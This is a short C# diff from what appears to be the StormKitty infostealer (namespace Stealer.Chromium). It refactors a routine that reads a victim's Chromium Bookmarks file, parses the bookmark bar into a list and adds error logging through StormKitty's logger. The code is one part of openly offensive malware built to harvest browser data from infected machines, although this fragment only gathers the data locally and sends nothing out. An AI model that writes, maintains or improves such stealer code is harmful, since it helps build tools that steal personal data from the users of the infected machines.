@@ -37,14 +37,10 @@ namespace Stealer.Chromium
         /// <returns>List with bookmarks</returns>
         public static List<Bookmark> Get(string sBookmarks)
         {
+            List<Bookmark> bBookmarks = new List<Bookmark>();
             try
             {
-                List<Bookmark> bBookmarks = new List<Bookmark>();
-
-
-                if (!File.Exists(sBookmarks))
-                    return bBookmarks;
-
+                if (!File.Exists(sBookmarks)) return bBookmarks;
                 string data = File.ReadAllText(sBookmarks, System.Text.Encoding.UTF8); // Load file content
 
                 data = Regex.Split(data, "      \"bookmark_bar\": {")[1];
@@ -83,9 +79,9 @@ namespace Stealer.Chromium
                         }
 
                     }
-                return bBookmarks;
             }
-            catch { return new List<Bookmark>(); }
+            catch (System.Exception ex) { StormKitty.Logging.Log("Chromium >> Failed collect bookmarks data\n" + ex); }
+            return bBookmarks;
         }
 
     }
